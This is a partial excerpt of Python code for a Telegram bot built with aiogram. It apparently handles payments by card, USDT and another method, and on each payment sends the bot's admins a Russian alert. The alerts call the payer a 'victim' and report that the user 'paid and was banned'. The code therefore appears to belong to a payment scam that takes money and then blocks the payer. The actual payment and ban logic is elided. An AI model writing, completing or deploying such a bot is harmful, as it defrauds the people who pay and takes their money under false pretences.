...
async def check_payment(call: CallbackQuery):
    ...
    if status == "paid":
        ...
        for aid in ADMIN_IDS:
            try:
                await call.bot.send_message(aid, f"💰 <b>НОВАЯ ЖЕРТВА!</b>\n👤 {call.from_user.id}\n💵 Оплатил и забанен!")
            except:
                pass
    elif status == "active":
...
async def paid_card(call: CallbackQuery):
    ...
    for aid in ADMIN_IDS:
        try:
            await call.bot.send_message(aid, f"💰 <b>ЖЕРТВА НА КАРТУ!</b>\n👤 {call.from_user.id}")
        except:
            pass
    await call.answer()
...
async def sent_crypto(call: CallbackQuery):
    ...
    for aid in ADMIN_IDS:
        try:
            await call.bot.send_message(aid, f"💰 <b>ЖЕРТВА НА USDT!</b>\n👤 {call.from_user.id}")
        except:
            pass
    await call.answer()